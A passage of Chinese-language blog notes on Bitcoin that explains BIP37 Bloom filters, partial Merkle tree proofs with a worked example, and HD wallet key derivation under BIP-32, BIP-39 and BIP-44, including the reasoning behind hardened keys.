<p>另外，还提供了Bloom_update_P2PUBKEY_ONLY选项，也即仅在输出脚本是 pay-to-pubkey或者是pay to multisig形式的时候才将outpoint添加到filter中。</p>
<p>思考：为什么有Bloom_update_P2PUBKEY_ONLY选项？</p>
<p>【在P2PKH类型的交易中，如果要花费，则在scriptsig中一定会有用户的公钥提供，所以用户可以通过在filter中添加自己的公钥来查询；从而防止filter性能快速下降】</p>
<p>问题：能不能通过删除项来更新bloom filter?</p>
<p>字符串加入了就被不能删除了，因为删除会影响到其他字符串。实在需要删除字符串的可以使用Counting bloomfilter(CBF)，这是一种基本Bloom Filter的变体，CBF将基本Bloom Filter每一个Bit改为一个计数器，这样就可以实现删除字符串的功能了。</p>
<p>　　Bloom Filter跟单哈希函数Bit-Map不同之处在于：Bloom Filter使用了k个哈希函数，每个字符串跟k个bit对应。从而降低了冲突的概率。</p>
<p>最后，分析一下Bloom Filter的效率和内容占用情况，为何说它速度快，占用内存小。</p>
<p>Bloom filter被广泛应用于各种领域，比如拼写检查、字符串匹配算法、网络包分析工具、Web Cache、文件系统、存储系统等。</p>
<p>这里举例分析一下Bloom filter在重复数据删除应用中的空间和时间效率。重复数据删除技术的基本原理是对文件进行定长或变长分块，然后利用hash函数计算数据块指纹，如果两个数据块指纹相同则认为是重复数据块（存在数据碰撞问题），只保存一个数据块副本即可，其他相同数据块使用该副本索引号表示，从而实现数据缩减存储空间并提高存储效率。</p>
<p>为了查询一个数据块是否重复或者已经存在，需要计算数据块指纹并进行查找，并记录所有唯一数据块的指纹。举一个例子：32TB的数据，平均数据块大小为8KB，每个数据块使用MD5和SHA1计算两个指纹并用64位整数表示唯一块号则共占用44字节((128+160+64)&#x2F;8），则总共最多需要176GB（32TB&#x2F;8KB * 44 Byte）的存储空间来保存数据块信息。</p>
<p>现在的去重系统数据容量通常多达数十到数百TB，如果把数据块信息全部保存在内存中，显然对内存的需求量非常巨大。通常的做法是把数据块信息保存在磁盘或SSD上，使用一定内存量作 Cache缓存数据块指纹，利用时间局部性和空间局部性来提高查找性能。这种方法的一个关键问题是，如果新的数据块是不重复的，查找时会出现Cache不命中，从而引起大量的磁盘读写操作。由于磁盘或SSD性能要远远小于内存的，对查找性能影响非常大。</p>
<p>Bloom filter可以有效解决这个问题，DataDomain中的Summary Vector就是采用Bloom filter来实现的。对于前面的例子，一个数据块用3个hash函数计算指纹最多占用3个位，则Bloom filter仅需要1.5GB &#x3D; 32TB&#x2F;8KB * 3 &#x2F;8 bytes的内存空间。引入Bloom filter机制后，对于一个新数据块，首先查找Bloom filter，如果未命中则说明这是一个新的唯一数据块，直接保存数据块和并Cache数据块信息即可；如果命中，则说明这有可能是一个重复数据块，需要通过进一步的hash或tree查找进行确认，此时需要Cache与Disk进行交互。受益于Bloom filter以及Cache，DataDomain系统可以减少99%的磁盘访问，从而利用少量的内存空间大幅提高了数据块查重性能。</p>
<p>最后：BIP37中介绍了Merkle路径的构造。</p>
<h2 id="Partial-Merkle-branch-format"><a href="#Partial-Merkle-branch-format" class="headerlink" title="Partial Merkle branch format"></a>Partial Merkle branch format</h2><p>A <em>Merkle tree</em> is a way of arranging a set of items as leaf nodes of tree in which the interior nodes are hashes of the concatenations of their child hashes. The root node is called the <em>Merkle root</em>. Every Bitcoin block contains a Merkle root of the tree formed from the blocks transactions. By providing some elements of the trees interior nodes (called a <em>Merkle branch</em>) a proof is formed that the given transaction was indeed in the block when it was being mined, but the size of the proof is much smaller than the size of the original block.</p>
<h2 id="Constructing-a-partial-merkle-tree-object"><a href="#Constructing-a-partial-merkle-tree-object" class="headerlink" title="Constructing a partial merkle tree object"></a>Constructing a partial merkle tree object</h2><ul>
<li><p>Traverse the merkle tree from the root down, and for each encountered node:</p>
</li>
<li><ul>
<li><p>Check whether this node corresponds to a leaf node (transaction) that is to be included OR any parent thereof: </p>
</li>
<li><ul>
<li>If so, append a ‘1’ bit to the flag bits 【要么是节点本身，要么是其祖先】</li>
<li>Otherwise, append a ‘0’ bit.</li>
</ul>
</li>
<li><p>Check whether this node is a internal node (non-leaf) AND is the parent of an included leaf node: 【如果是节点祖先，那么才继续处理其孩子；否则，孩子跳过；注意叶子节点也需要添加hash，实际上要处理的叶子节点只有目标节点和它的兄弟节点】</p>
</li>
<li><ul>
<li><p>If so:</p>
</li>
<li><ul>
<li>Descend into its left child node, and process the subtree beneath it entirely (depth-first).</li>
<li>If this node has a right child node too, descend into it as well.</li>
</ul>
</li>
<li><p>Otherwise: append this node’s hash to the hash list.</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>【这段的结果是，从根往下遍历，能够将需要返回的Merkle路径的所有节点的flag设置为0】</p>
<h2 id="Parsing-a-partial-merkle-tree-object"><a href="#Parsing-a-partial-merkle-tree-object" class="headerlink" title="Parsing a partial merkle tree object"></a>Parsing a partial merkle tree object</h2><p>As the partial block message contains the number of transactions in the entire block, the shape of the merkle tree is known before hand. Again, traverse this tree, computing traversed node’s hashes along the way:</p>
<ul>
<li><p>Read a bit from the flag bit list:</p>
</li>
<li><ul>
<li><p>If it is ‘0’:</p>
</li>
<li><ul>
<li>Read a hash from the hashes list, and return it as this node’s hash.</li>
</ul>
</li>
<li><p>If it is ‘1’ and this is a leaf node:</p>
</li>
<li><ul>
<li>Read a hash from the hashes list, store it as a matched txid, and return it as this node’s hash.</li>
</ul>
</li>
<li><p>If it is ‘1’ and this is an internal node:</p>
</li>
<li><ul>
<li><p>Descend into its left child tree, and store its computed hash as L.</p>
</li>
<li><p>If this node has a right child as well:</p>
</li>
<li><ul>
<li>Descend into its right child, and store its computed hash as R.</li>
<li>If L &#x3D;&#x3D; R, the partial merkle tree object is invalid.</li>
<li>Return Hash(L || R).</li>
</ul>
</li>
<li><p>If this node has no right child, return Hash(L || L).</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>【这段是对返回的Merkle路径上的哈希值进行处理验证】</p>
<p>The partial merkle tree object is only valid if:</p>
<ul>
<li>All hashes in the hash list were consumed and no more.</li>
<li>All bits in the flag bits list were consumed (except padding to make it into a full byte), and no more.</li>
<li>The hash computed for the root node matches the block header’s merkle root.</li>
<li>The block header is valid, and matches its claimed proof of work.</li>
<li>In two-child nodes, the hash of the left and right branches was never equal.</li>
</ul>
<p>【关于以上算法，让人非常迷惑的地方在于，假设对树的结构已知的情况下，为何需要如此麻烦的算法。假设在一棵有16个叶子节点的满二叉树上，针对任何一个叶子都可以很容易算出Merkle路径（给定编号）；而且在获得Merkle路径的哈希值之后，只要从后向前依次合并计算即可；这是2018年时的迷惑】</p>
<p>看了两年之后，终于悟了。上面的算法本身就是在对树结构已知的情况下，判断一个节点是否是目标节点的祖先。同时，经过一遍遍历，便获得所需的信息。【一个猜想是，这里的数据结构是KV结构，不能像数组那样可以直接根据下表索引获得内容；所以只能通过遍历的方式获得。所以，还是得去看源码】</p>
<p>理一遍过程：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233049.jpg" alt="img"></p>
<p>以8个交易的满二叉树为例。假设我们的目标是第三个交易，也即上图中的节点10。那么根据算法，深度优先算法遍历，需要处理的节点是1、2、4、5、10、11、3；获得的标记list是1、1、0、1、1、0、0；获得的hashlist是null、null、hash、null、hash、hash、hash。</p>
<p>在进行解析的过程中，从1开始，进入左节点，找到2，2对应的标记是1并且是内部节点，所以继续找到4，4对应的标记是0，从hashlist返回哈希值；接着处理5，5的标记是1且是内部节点，分别处理10和11；10和11都返回哈希值，从而可以计算出5的哈希值；获得4和5的哈希值之后，2可以计算得出哈希值；1的左孩子处理完成；接着处理3，3的标记是0，直接返回哈希值，从而可以计算得出1的哈希值，也就是merkleroot。此时可以将该计算结果与SPV存储的区块头信息进行对比。</p>
<p>参考：</p>
<ol>
<li><a href="https://link.zhihu.com/?target=https://cloud.tencent.com/developer/article/1082346">理解区块链背后的Merkle Tree</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.coingogo.com/article/1690">https://www.coingogo.com/article/1690</a></li>
<li><a href="https://link.zhihu.com/?target=http://haroldcarr.com/posts/2017-07-31-the-block-in-blockchain-merkle-trees.html">the block in blockchain explained (merkle trees)</a></li>
<li><a href="https://link.zhihu.com/?target=https://ethfans.org/posts/merkle-patricia-tree-in-detail">干货 | Merkle Patricia Tree 详解</a></li>
<li><a href="https://link.zhihu.com/?target=https://shuwoom.com/?p=692">Merkle树和SPV机制 | shuwoom的博客</a></li>
<li><a href="https://link.zhihu.com/?target=http://book.8btc.com/books/1/master_bitcoin/_book/6/6.html">第6章 比特币网络 · 精通比特币-巴比特图书</a></li>
<li><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0037.mediawiki">bitcoin&#x2F;bips</a></li>
<li><a href="https://link.zhihu.com/?target=https://blog.csdn.net/liuaigui/article/details/6602683">深入理解Bloom Filter</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.jianshu.com/p/46b07467373a">https://www.jianshu.com/p/46b07467373a</a> （有代码）</li>
</ol>
<h1 id="区块链技术10-如何存储和使用比特币"><a href="#区块链技术10-如何存储和使用比特币" class="headerlink" title="区块链技术10:如何存储和使用比特币"></a>区块链技术10:如何存储和使用比特币</h1><p>管理私钥需要考虑三个目标，所有各种保管密钥的方法就是这三个目标的折中：</p>
<ol>
<li>可用性：当需要使用比特币的时候，可以用得上；</li>
<li>安全性：保证其他人不能使用你的私钥；</li>
<li>方便性：用的时候比较简单。</li>
</ol>
<p>我们来考虑下，如果把密钥写在纸上，那考虑到可用性，就需要随身把纸带在身上，那安全性就不用说了，方便性的话，输入起来也不方便。保存在电脑上也同样的问题，如果电脑被偷了，或者说电脑崩溃了，那所有的钱都没了；如果有人黑进了你的电脑，所有的币也都没了。</p>
<p>所以把私钥保存在本地机器上，特别是移动设备上，相当于把所有的钱都装在钱包里带在身上。如果手机丢了，所有的比特币也都丢了。</p>
<p>（现在有很多钱包软件和硬件，帮忙管理私钥，特别是用户有多个账户时，使用钱包帮忙管理是非常有效的。而且钱包软件可以帮忙方便地查看余额和交易等信息。）</p>
<p>将密钥存在移动设备就像把钱带在身上，方便使用但是安全性不佳，这种方式叫做“Hot strorage”；另一种方式是将密钥锁起来，不上网，用起来不方便，但是很安全，这种叫做“cold storage”（将经过Passphrase加密后的私钥写在纸上是不错的方法）。保存纸币时我们正常的做法是带点零钱在身上，然后将大部分的积蓄放在银行里。也即hot storage和cold storage相结合。</p>
<p>所以，很明显，需要对Hot storage和cold storage准备不同的密钥。否则，分开存储就没有任何意义了。</p>
<p>另一方面，为了更好的匿名性，也需要更多的公私钥对，譬如最好是一笔交易换一个地址。自然，催生出一种需求，就是批量生成密钥。</p>
<h2 id="非确定性钱包"><a href="#非确定性钱包" class="headerlink" title="非确定性钱包"></a>非确定性钱包</h2><p><strong>之所以叫非确定性钱包，主要因为这种钱包生成的私钥，互相之间是没有任何关系的，每个私钥都是独立的。</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233050.jpg" alt="img">零型非确定性钱包示意图</p>
<h2 id="确定性钱包"><a href="#确定性钱包" class="headerlink" title="确定性钱包"></a>确定性钱包</h2><p>第二种类型是确定性钱包（deterministic wallet），其中所有的密钥都是从一个主密钥派生出来，这个主密钥即为种子（seed）。该类型钱包中所有密钥都相互关联，如果有原始种子，则可以再次生成全部密钥。确定性钱包中使用了许多不同的密钥推导方法。最常用的推导方法是使用树状结构，称为分级确定性钱包或HD钱包。确定性钱包由种子衍生创造。为了便于使用，种子被编码为英文单词，也称为助记词。</p>
<h3 id="HD钱包"><a href="#HD钱包" class="headerlink" title="HD钱包"></a>HD钱包</h3><p>下列 BIP 共同定义了一种确定性钱包的实现，这种钱包被称为分层确定性（HD，Hierarchical Deterministic）钱包。</p>
<ul>
<li><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0032.mediawiki">BIP-32</a>，HD 钱包中的密钥如何衍生</li>
<li><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki">BIP-39</a>，HD 钱包助记词（Mnemonic）和种子（Seed）的创建规则</li>
<li><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0044.mediawiki">BIP-44</a>，支持多币种和多账户的 HD 钱包</li>
</ul>
<p>除此之外，还有</p>
<ul>
<li><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0043.mediawiki">BIP-43</a>，多用途（purpose）HD 钱包的结构定义</li>
<li><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0045.mediawiki">BIP-45</a>，通过 P2SH 实现多签的 HD 钱包</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233051.jpg" alt="img">HD型钱包示意图</p>
<p>BIP-32&#x2F;BIP-44</p>
<p>BIP-32标准定义了HD钱包。HD钱包包含以树状结构衍生的密钥，使得父密钥可以衍生一系列子密钥，每个子密钥也可以衍生出一系列孙密钥，以此类推。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233052.jpg" alt="img"></p>
<p>HD钱包有两个主要的优势。第一，树状结构可以被用来表达额外的组织含义。比如当一个特定分支的子密钥被用来接收交易收入并且有另一个分支的子密钥用来负责支付花费。不同分支的密钥都可以被用在企业环境中，这就可以支配不同的分支部门、子公司、具体功能以及会计类别。第二，用户可以建立一个公钥的序列而不需要访问相对应的私钥。所以HD钱包在不安全的服务器中使用或者在每笔交易中发行不同的公钥。公钥不需要被预先加载或者提前衍生，而在服务器中不需要可用来支付的私钥。</p>
<p>下面来看一下，怎么样从种子生成密钥树。因为16进制表示的种子： 0C1E24E5917779D297E14D45F14E1A1A 难以记忆，所以BIP-39标准中定义了助记词。上面的种子相对应的助记词表示：</p>
<p>army van defense carry jealous true garbage claim echo media make crunch</p>
<p>思考：128位是如何生成12个助记词的？</p>
<p>助记词是由钱包使用BIP-39中定义的标准化过程自动生成的。 钱包从熵源开始，增加校验和，然后将熵映射到单词列表：</p>
<p>1、创建一个128到256位的随机序列（熵）。</p>
<p>2、提出SHA256哈希前几位（熵长&#x2F; 32），就可以创造一个随机序列的校验和。</p>
<p>3、将校验和添加到随机序列的末尾。</p>
<p>4、将序列划分为<strong>包含</strong>11位的不同部分。</p>
<p>5、将每个包含11位部分的值与一个已经预先定义2048个单词的字典做对应。</p>
<p>6、生成的有顺序的单词组就是助记码。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233053.jpg" alt="img"></p>
<p>总结一下：HD钱包具有管理多个密钥和地址的强大机制。由一系列英文单词生成种子是个标准化的方法，这样易于在钱包中转移、导出和导入， 这些英文单词被称为助记词，标准由BIP-39定义。大多数比特币钱包（以及其他加密货币的钱包）使用此标准，并可以使用可互操作的助记词导入和导出种子进行备份和恢复。</p>
<p>16进制表示： 0C1E24E5917779D297E14D45F14E1A1A</p>
<p>助记词表示：</p>
<p>army van defense carry jealous true garbage claim echo media make crunch</p>
<p>助记词表示长度为128至256位的熵。 通过使用密钥延伸函数PBKDF2，熵被用于导出较长的（512位）种子。将所得的种子用于构建确定性钱包并得到其密钥。</p>
<p>思考：能不能暴力破解他人的钱包？</p>
<p>创建助记词之后的7-9步是：</p>
<p>7、PBKDF2密钥延伸函数的第一个参数是从步骤6生成的助记符。</p>
<p>8、PBKDF2密钥延伸函数的第二个参数是盐。 由字符串常数“助记词”与可选的用户提供的密码字符串连接组成。</p>
<p>9、PBKDF2使用HMAC-SHA512算法，使用2048次哈希来延伸助记符和盐参数，产生一个512位的值作为其最终输出。 这个512位的值就是种子。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233054.jpg" alt="img"></p>
<p>有个这个512比特的种子，可以开始公私钥对的生成。</p>
<p>总结：HD钱包从单个根种子（root seed）中创建。最常见的是，这个种子是从助记符产生的，HD钱包的所有的确定性都衍生自这个根种子。任何兼容HD 钱包的根种子也可重新创造整个HD钱包。所以简单的转移HD钱包的根种子就让HD钱包中所包含的成千上百万的密钥被复制，储存导出以及导入。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233055.jpg" alt="img"></p>
<p>从上图可以看出，从root seed生成公私钥对的过程，就是对root seed进行一次HMAC-SHA512的加密哈希，在生成512的结果之后，将512位结果划分为两个256部分，分别是Master private key（主私钥）和Master Chain Code（主链码）。</p>
<p>HMAC-SHA512 使用 SHA512 哈希算法，以一个消息（Message）和一个密钥（Key）作为输入，生成 512 位（64 字节）的消息摘要（Digest）作为输出。</p>
<p>从种子计算主私钥时，种子作为输入的消息，字符串<code>Bitcoin seed</code>作为输入的密钥，计算产生 512 位的输出。</p>
<ul>
<li>输出的高 256 位，是主私钥</li>
<li>输出的低 256 位，是主链码（Master Chain Code）</li>
</ul>
<p>总结一下：</p>
<ul>
<li>种子从助记词和用户密语计算而来</li>
<li>助记词从一个随机序列计算而来，查阅特定的单词表后最终确定</li>
<li>即使随机序列的内容一样，查阅不同语言的单词表，可以得到不同的助记词，从而计算出不同的种子</li>
<li>即使助记词的内容一样，指定不同的密语，可以得到不同的种子</li>
</ul>
<p><strong>HD 钱包的确定性来源于种子，当种子确定后，钱包中的所有私钥就都是确定的，都可以从种子计算出来</strong>。</p>
<p>所以用户可以直接记录下这个种子的值，作为 HD 钱包的备份，只不过这一大串内容抄写起来有点麻烦。</p>
<p>对一个 HD 钱包，初始化种子的过程涉及到两个<strong>变量</strong>：</p>
<ul>
<li>助记词（由随机序列的内容和助记词的语言共同决定）</li>
<li>用户指定的密语</li>
</ul>
<p>所以在备份 HD 钱包时，需要<strong>同时备份助记词和密语</strong>，这样就相当于备份了整个钱包内的所有私钥。</p>
<p>HD 钱包中的私钥是树状的层级结构。</p>
<ul>
<li>树根位置的私钥，称为主私钥（Master Private Key），从种子直接计算得到</li>
<li>树中的某个私钥，从其父私钥计算得到。</li>
</ul>
<hr>
<p>然后从上图中还可以看到从主私钥有个箭头到Master Public Key，也即从私钥到公钥。</p>
<p>HD协议使用的是ECDSA公钥函数 point()，这个函数接受一个大整数（也即私钥），将它转换成图上的一个点，也即公钥。这也和我们的常识是符合的，非对称加密系统中，公私钥可以互相生成。而且椭圆曲线数学方案使得可以在不泄露私钥的情况下计算公钥。例如，这允许网络商店业务让其网络服务器为每个订单或每个客户生成新的地址（公钥哈希），而无需让网络服务器访问相应的私钥（花费收到的资金是必需的）。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">point(private_key) == public_key</span><br></pre></td></tr></table></figure>

<p>然后还有一个问题，为什么剩下的256位要作为链码呢？链码是用来干啥的呢？</p>
<p>这里我们要稍微了解一下point的工作特点。下面的这个等式是成立的。意味着什么呢？这里的参数 i理解为index，也即生成子密钥时的索引。通过将祖先私钥与索引 i 相加，然后传入到point()中，可以生成子公钥，这是左边的计算（私钥生成公钥，改变私钥，也就生成新的公私钥对）。等式右边显示的是，新生成的这个公钥完全不需要使用私钥来生成，直接根据祖先公钥来做就行了。也即，只要有公钥，就可以生成新的公钥。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">point( (parent_private_key + i) % p ) == parent_public_key + point(i)</span><br></pre></td></tr></table></figure>

<p>新生成的子公钥可以继续生成后代公钥。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">point( (child_private_key + i) % p ) == child_public_key + point(i)</span><br></pre></td></tr></table></figure>

<p>这个特点带来的影响是什么呢？</p>
<ol>
<li>如果共享一对祖先密钥的两个程序想就一系列的公私钥对达成一致，它们只需要共同商议确定下来一系列的整数就行了。</li>
<li>知道一个祖先公钥，可以生成多个子公钥，然后这些子公钥可以用来在不安全的服务器上使用，作为付款的接收地址。因为服务器并不知道私钥，所以服务器即使被攻击，也不会有私钥泄露的危险。</li>
<li>不论是子公钥还是更下层的后代公钥，如果是从子公钥能够推导出自己的兄弟姐妹公钥，那么生成多个公钥和只有一个公钥没有什么区别。因为任何人只要知道其中的一个，就能找出其他所有的。所以需要加入新的计算参数，切断同一父节点生成的兄弟姐妹公钥之间的联系。</li>
</ol>
<p><strong>扩展密钥</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233056.jpg" alt="img"></p>
<p>HD协议使用256位的Chain Code（也称作熵）来生成子密钥对，而且每个子密钥对都有自己的chain code。这样，即使有一个子密钥分支被攻击，其他的分支可以不受影响。</p>
<p>如上图所示，HD密钥的生成接收了四个输入：</p>
<ul>
<li>祖先私钥 和 祖先公钥</li>
<li>256位的祖先链码</li>
<li>32位的索引值</li>
</ul>
<p>上图的计算中，链码、公钥和索引值作为HMAC-SHA512的参数输入，产生512位确定的但是足够随机的输出。这512位输出的右一半的256位作为子密钥的链码。左一半的256位作为生成子密钥的输入lefthand_hash_output。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">child_private_key == (parent_private_key + lefthand_hash_output) % G</span><br><span class="line">child_public_key == point( (parent_private_key + lefthand_hash_output) % G )</span><br><span class="line">child_public_key == point(child_private_key) == parent_public_key + point(lefthand_hash_output)</span><br></pre></td></tr></table></figure>

<p>上面的三个等式，第一个是子私钥的生成；第二个是从子私钥生成子公钥；第三个是从父公钥直接生成子公钥。【注1：因为子公钥和父公钥之间的关系依赖于 point(lefthand_hash_output)， 而point(lefthand_hash_output)的值依赖于链码、父公钥和索引，缺少的值仅仅是链码】【注2：因为父公钥已知，链码在同一对父公私钥的情况下的是固定的，如果链码泄露的情况下，还是可以推导出兄弟姐妹公钥；】【注3：因此，扩展公钥，不同于公钥，公钥是理所当然应该公开的；而扩展公钥因为是公钥和链码的连接，为了保护链码，应该保护扩展公钥】</p>
<p>【Specifying different index numbers will create different unlinkable <a href="https://link.zhihu.com/?target=https://bitcoin.org/en/glossary/child-key">child keys</a> from the same <a href="https://link.zhihu.com/?target=https://bitcoin.org/en/glossary/parent-key">parent keys</a>. Repeating the procedure for the <a href="https://link.zhihu.com/?target=https://bitcoin.org/en/glossary/child-key">child keys</a> using the <a href="https://link.zhihu.com/?target=https://bitcoin.org/en/glossary/chain-code">child chain code</a> will create unlinkable grandchild keys.】</p>
<p>总结一下，根据 <a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0032.mediawiki">BIP-32</a> 的定义：</p>
<ul>
<li>可以从私钥和链码，衍生出其<strong>所有的</strong>子私钥及对应的子公钥（及之后每层所有的子私钥及对应的子公钥）</li>
<li>可以从公钥和链码，衍生出其<strong>常规衍生</strong>的子公钥（及之后每层常规衍生的子公钥）</li>
<li>无法从某个密钥（公钥和私钥）计算出其父密钥，或同层的其他兄弟密钥</li>
</ul>
<hr>
<p>衍生子密钥时需要将密钥、链码和子密钥序号作为 CKD 的输入，三者缺一不可。为了方便转录，可以将<strong>密钥</strong>和<strong>链码</strong>编码在一起，得到<strong>扩展密钥</strong>（Extended Key）。扩展私钥和相对应的扩展公钥具有相同的链码。扩展密钥使用 Base58Check 编码，并添加特定的版本前缀。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233057.jpg" alt="img"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233058.jpg" alt="img"></p>
<p>安全性：</p>
<p>扩展密钥使用方便，但要注意：</p>
<ul>
<li>虽然泄露某个扩展公钥不会丢币，但会导致以此为根节点衍生出的扩展公钥全部泄露，破坏了隐私性</li>
<li>泄露扩展公钥和该公钥衍生出的之后任一代公钥对应的私钥，有被推导出该扩展公钥所有后代私钥的可能</li>
</ul>
<p>也即，如果攻击者获得了父链码和父公钥，那么就可以获得所有的子链码。有了子链码，如果又获得了底层的某一个私钥（孙子密钥），那么可以根据这个链码生成所有的扩展私钥。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233059.jpg" alt="img"></p>
<p>更惨的是，攻击者可能通过子密钥逆推回祖先私钥。也即，如果攻击者获得了一个扩展公钥，以及任何它的子孙私钥，那么就能够推出这个公钥对应的私钥，以及所有的后代密钥。</p>
<p>因此，扩展公钥的链码部分需要好好保存。也因此提出了强化子密钥的概念。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233060.jpg" alt="img"></p>
<p>强化的子密钥生成需要祖先链码、祖先私钥和索引值生成子链码和子私钥。这样的话，仅仅知道祖先扩展公钥不能用来生成强化的子公钥。（无法生成Left-hand-output，所以知道父公钥的情况下，也不能直接计算出子公钥；）</p>
<p>因此，强化的子密钥的应用场景没有正常生成的子密钥多。但是可以防御上面的攻击。</p>
<p>m表示私钥，M表示公钥；有小撇号的表示强化的子密钥。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233061.jpg" alt="img"></p>
<p>HD钱包树状结构提供了极大的灵活性。每一个母扩展密钥有40亿个子密钥：20亿个常规子密钥和20亿个强化子密钥。 而每个子密钥又会有40亿个子密钥并且以此类推。只要你愿意，这个树结构可以无限类推到无穷代。但是，又由于有了这个灵活性，对无限的树状结构进行导航就变得异常困难。为了能方便表示密钥间关系，定义了衍生路径（Derivation Path）的概念。</p>
<ul>
<li>序号之间以<code>/</code>分隔</li>
<li><code>m</code>表示主密钥</li>
<li><code>i</code>表示第 i个常规衍生的子密钥，即第 i个子密钥</li>
<li><code>i&#39;</code>表示第 i个硬化衍生的子密钥，即第 (2^31+i) 个子密钥</li>
</ul>
<p><code>m/0&#39;/1&#39;/2</code>表示主密钥的第 0 个强化衍生子密钥的第 1 个强化衍生子密钥的第 2 个常规衍生子密钥（树形结构）。</p>
<p>扩展密钥加上衍生路径，可以确定 HD 钱包里的一个密钥及从这个密钥衍生的之后所有层的子密钥（以这个密钥为根的子树）。</p>
<p>BIP-44提议了多账户结构作为“purpose”。所有遵循BIP-44的HD钱包依据只使用树的第一个分支的要求而被定义：m&#x2F;44’&#x2F;。 BIP-44指定了包含5个预定义树状层级的结构：</p>
<p>m &#x2F; purpose’ &#x2F; coin_type’ &#x2F; account’ &#x2F; change &#x2F; address_index</p>
<p>第一层的purpose总是被设定为44’。</p>
<p>第二层的“coin_type”特指币种并且允许多元货币HD钱包中的货币在第二个层级下有自己的亚树状结构。目前有三种货币被定义：Bitcoin is m&#x2F;44’&#x2F;0’、Bitcoin Testnet is m&#x2F;44’&#x2F;1’，以及 Litecoin is m&#x2F;44’&#x2F;2’。</p>
<p>树的第三层级是“account”，这可以允许使用者为了会计或者组织目的，而去再细分他们的钱包到独立的逻辑性亚账户。 举个例子，一个HD钱包可能包含两个比特币“账户”：m&#x2F;44’&#x2F;0’&#x2F;0’ 和 m&#x2F;44’&#x2F;0’&#x2F;1’。每个账户都是它自己亚树的根。</p>
<p>第四层级就是“change”。每一个HD钱包有两个亚树，一个是用来接收地址，一个是用来创造找零地址。注意无论先前的层级是否使用强化衍生，这一层级使用的都是常规衍生。这是为了允许这一层级的树可以在不安全环境下，输出扩展公钥。</p>
<p>被HD钱包衍生的可用的地址是第四层级的子级，就是第五层级的树的“address_index”。比如，第三个主账户接收比特币支付的地址就是 M&#x2F;44’&#x2F;0’&#x2F;0’&#x2F;0&#x2F;2。</p>
<p>举个例子：</p>
<p>用户初始化了一个 HD 钱包，使用衍生路径<code>m/44&#39;/236&#39;/0&#39;</code>作为存放 Bitcoin SV（BSV）的“账户”，那么，</p>
<ul>
<li>第一个收款地址是公钥<code>m/44&#39;/236&#39;/0&#39;/0/0</code>对应的地址，第二个收款地址是公钥<code>m/44&#39;/236&#39;/0&#39;/0/1</code>对应的地址，以此类推</li>
<li>当完成第一次支付并存在找零时，会找零到地址<code>m/44&#39;/236&#39;/0&#39;/1/0</code>，下一次支付找零到的地址会是<code>m/44&#39;/236&#39;/0&#39;/1/1</code>，以此类推</li>
<li>如果想再新建一个 BSV “账户”另作他用，可以使用路径<code>m/44&#39;/236&#39;/1&#39;</code></li>
<li>如果还想用这个 HD 钱包存放 BCH，可以使用路径<code>m/44&#39;/145&#39;/0&#39;</code></li>
</ul>
<h3 id="HD-钱包的优势"><a href="#HD-钱包的优势" class="headerlink" title="HD 钱包的优势"></a>HD 钱包的优势</h3><p>HD 钱包在备份时十分方便。</p>
<ul>
<li>只需要备份<strong>助记词</strong>和<strong>密语</strong>，就等于备份了整个钱包内的所有私钥</li>
<li>除此之外，你还要记下使用的<strong>衍生路径</strong>，这样才能知道使用了哪些私钥</li>
</ul>
<p>另外，从扩展公钥可以常规衍生子公钥及对应地址而不用访问扩展私钥或私钥本身，这是 HD 钱包一个很重要的安全特性。</p>
<p>密钥间的树形结构，与机构的部门设置十分相似，如果一家企业准备使用比特币进行财务收支，可以：</p>
<ul>
<li><p>将路径<code>m/0&#39;/0&#39;/x&#39;</code>的扩展公钥交给各销售部门独自管理和使用</p>
</li>
<li><ul>
<li>销售部门可以为每笔订单生成不同的收款地址，方便状态跟踪</li>
<li>因为从扩展公钥无法衍生出子私钥，所以销售部门只能收款而无法支付账户里的比特币</li>
</ul>
</li>
<li><p>将路径<code>m/0&#39;/0&#39;</code>的扩展公钥交给市场部，市场部可以查阅所有订单的销售记录，同样无法支付比特币</p>
</li>
<li><p>将路径<code>m/0&#39;/0&#39;</code>的扩展私钥交给财务部，财务部可以用这个更上层的扩展私钥，管理整个公司的加密资产</p>
</li>
</ul>
<p>配合 <a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0045.mediawiki">BIP-45</a> 定义的 HD 钱包多签方案，可以方便、安全、灵活的管理公司的加密资产。</p>
